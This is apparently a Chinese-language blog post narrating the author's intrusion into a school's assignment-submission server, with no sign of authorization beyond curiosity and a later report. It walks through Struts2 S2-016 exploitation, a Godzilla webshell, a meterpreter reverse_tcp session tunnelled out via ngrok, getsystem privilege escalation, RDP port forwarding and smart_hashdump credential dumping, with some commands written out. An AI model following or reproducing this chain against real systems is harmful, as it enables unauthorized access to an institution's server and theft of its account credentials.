***该漏洞已上报相应学校管理员。**

##  **前言**

今天又是风和日丽的一天，莫名其妙搞到学校会计系的一个文档，好奇心促使我点开看了一眼，发现了一个作业提交平台，ip为：*.*.*.114:9100,看着这熟悉的ip，我又点开了那尘封已久的信息收集导图。

![1650800169_62653629ec5f00c38e20e.png!small](https://image.3001.net/images/20220424/1650800169_62653629ec5f00c38e20e.png!small)

发现貌似并没有做太详细的收集，于是，我又打开了那令人爱恨不得的nmap，开始了漫长的等待……

**![1650800244_6265367438c75c5acb9c0.png!small](https://image.3001.net/images/20220424/1650800244_6265367438c75c5acb9c0.png!small)**

##  **漏洞发现**

经过一番搏斗，大概了解了目标，接下来，又是各种摸索伦打，尝试各种，手工注入、密码爆破……无果…
你以为我这就放弃了？没错是打算放弃了，当我正准备关机时，“一束光照在了avws上”我抱着试一试的心态，扫了一下目标站点，不扫不知道一扫吓一跳啊，比惊喜更惊喜的无疑是这个凸显眼前的Struts2漏洞，这确实是让我没想到的没想到。![1650806262_62654df66644af9739fff.png!small](https://image.3001.net/images/20220424/1650806262_62654df66644af9739fff.png!small)

##  **漏洞验证**

根据avws提供的路径，接下来我们便去做了个小小的漏洞验证，首先去GitHub上了Struts2的小工具包，是由python3编写，下载解压完，打开我们的dos终端，用python.exe
Struts2Scan.py -u
url![1650806287_62654e0f092de39f8980e.jpg!small](https://image.3001.net/images/20220424/1650806287_62654e0f092de39f8980e.jpg!small)

可以看到漏洞s2-016确实存在，虽然有点老，不管哈哈哈。

##  **漏洞利用**

又恰好在我的工具包里有一个2018年的Struts2的exp整合利用包，上去看一下，也还好，可以用S2-016，接下来就是惊心动魄的时候了，输入漏洞存在的路径，选择exp，一键捅穿。![1650806316_62654e2c739d5b4be6f8e.jpg!small](https://image.3001.net/images/20220424/1650806316_62654e2c739d5b4be6f8e.jpg!small)![1650806326_62654e362d843b4d6bbe3.png!small](https://image.3001.net/images/20220424/1650806326_62654e362d843b4d6bbe3.png!small)

可以看到，已经利用成功了，接下来whoami看看权限，可以看到，administratora权限，哟还挺高。（这里解释一下，jsp脚本的站点，一般情况下，只要不被降权，都会继承administrator权限）

###  **Get webshell**

你以为拿到个shell就结束了吗，当然不是，由于工具限制，这里我们考虑上个大马，功能更齐全，方便下一步的。![1650806369_62654e6123999eab7e1d1.png!small](https://image.3001.net/images/20220424/1650806369_62654e6123999eab7e1d1.png!small)![1650806362_62654e5aade33125c9262.png!small](https://image.3001.net/images/20220424/1650806362_62654e5aade33125c9262.png!small)渗透却发现，能上传上去，却连接不了，怎么办呢？难不成就此结束？那不可能，细细摸索一番后，恍然大悟，原来是它的tomaca版本太低，执行不了我们的大马，那咋办呢……一番思索，想起了哥斯拉大战变形金刚，那就用哥斯拉试试吧，

![1650806387_62654e73a4d1d20532a94.png!small](https://image.3001.net/images/20220424/1650806387_62654e73a4d1d20532a94.png!small)首先用哥斯拉生成个脚本，然后，我们再上传到服务器，接下来，激动人心的时候到了，用哥斯拉成功链接！
由于是第一次用哥斯拉的马，这个马确实功能有点惨不忍睹，一番熟悉，发现这个马儿居然集成了一个msf，那好玩了呀。

###
**![1651032471_6268c19753fcc24edbfec.jpeg!small](https://image.3001.net/images/20220427/1651032471_6268c19753fcc24edbfec.jpeg!small)**

###  **提权**

虽然它本身就是个administrator权限，但我依旧觉得system权限更香。接下来，便是我们的各种提权操作，考虑到服务器上有360，做个免杀吧，太麻烦了，干脆，写个无文件加载到内存，由于出生在一个风吹雨淋的小山村，兜里的money不允许我随意嚯嚯，于是，先上去ngrok做个免费的隧道吧，慢是慢了点，比没有好吧。![1650800304_626536b0120432fc6f26e.png!small](https://image.3001.net/images/20220424/1650800304_626536b0120432fc6f26e.png!small)

隧道做好了，先连接一下我们的kali，在kali里下载一个ngrok客户端，然后连接上我们的隧道。

![1650800438_62653736a7cc5c1d64f4a.png!small](https://image.3001.net/images/20220424/1650800438_62653736a7cc5c1d64f4a.png!small)

接下来，生成并侦听个无文件的payload ，handler -p windows/meterpreter/reverse_tcp -H 127.0.0.1
-P 80

![1650800477_6265375d2dc71e786ba5e.png!small](https://image.3001.net/images/20220424/1650800477_6265375d2dc71e786ba5e.png!small)

在另外一边，哥斯拉上的msf中，连接我们的ngrok的一个地址，并发送，等待session回来

![1650806459_62654ebb7df00f7fe48d1.jpg!small](https://image.3001.net/images/20220424/1650806459_62654ebb7df00f7fe48d1.jpg!small)

可以看到，找个很让人头疼的东西，导致我的session一直没有回弹，无限重连。

![1650800498_626537725dbf066c89c4c.png!small](https://image.3001.net/images/20220424/1650800498_626537725dbf066c89c4c.png!small)

排查了一下原因，本以为是隧道问题，氪金去买了个隧道，回过头再尝试连接……并无卵用白浪费我一顿饭钱。![1650800606_626537dec0762f80f7984.png!small](https://image.3001.net/images/20220424/1650800606_626537dec0762f80f7984.png!small)

思索一番后，我拿上了我的电脑，去了图书馆，session回弹成功了，跟我想的一样，在此建议亲爱的校长，能不能把宿舍的网络带宽换高点，20Mb真的不够用，好了咱继续。

这个时候，我们的session已经过来了。![1650800672_6265382057599aca5c9a9.png!small](https://image.3001.net/images/20220424/1650800672_6265382057599aca5c9a9.png!small)

日常getuid可以看到是administrator权限，接下来，该想办法提权了，还是考虑到有360的原因很麻烦，这时候只能碰碰运气试试会话劫持了。![1650800688_6265383014167db951af9.png!small](https://image.3001.net/images/20220424/1650800688_6265383014167db951af9.png!small)

直接getsystem试试，劫持成功。

接下来，再getuid可以看到，我们已经是system权限了。![1650800700_6265383cef3553bd320f5.png!small](https://image.3001.net/images/20220424/1650800700_6265383cef3553bd320f5.png!small)

 **3389端口转发连接：**

这步就很easy了，首先咱先看看，它的3389有没有开，netstat
-a,可以看到3389是开放了的。![1650800740_6265386429d6e348f9f76.png!small](https://image.3001.net/images/20220424/1650800740_6265386429d6e348f9f76.png!small)

然后ipconfig看一下内网ip![1650800755_626538731efd9fee7c932.png!small](https://image.3001.net/images/20220424/1650800755_626538731efd9fee7c932.png!small)

打开autorouter
转发整个内网c段吧![1650800781_6265388d5f809433fe696.png!small](https://image.3001.net/images/20220424/1650800781_6265388d5f809433fe696.png!small)

再然后直接用portfwd将它的3389转到我们本地的9998就可以了![1650800865_626538e196489ddc05e84.png!small](https://image.3001.net/images/20220424/1650800865_626538e196489ddc05e84.png!small)

我们在打开一个终端，用rdesktop直接去链接我们本地，刚才转发出来的端口就可以了，连接上后看到需要密码，那咋办呢，思考一下。

往下，我们现在是提权到了system权限的可以去读取它的一个hash

##  **Hash读取**

利用kali自带的小脚本，run post/windows/gather/smart_hashdump

![1650800894_626538fee0a14c2b9c5d6.png!small](https://image.3001.net/images/20220424/1650800894_626538fee0a14c2b9c5d6.png!small)

可以看到，hash已经读取出来了，找个解密站点解开就行了，拿着解出来的密码，可以看到，我们已经是顺利的登录上了，是台08的服务器。![1650800910_6265390e7804fb3afbfad.png!small](https://image.3001.net/images/20220424/1650800910_6265390e7804fb3afbfad.png!small)

![1650800952_626539384afc1a5539b0e.png!small](https://image.3001.net/images/20220424/1650800952_626539384afc1a5539b0e.png!small)

##  **尾言**

因为部分原因后续的权限维持和横向渗透就不做了，各位有兴趣的可以搭建一个tomcat的靶场复现一下，有什么问题欢迎评论区留言。

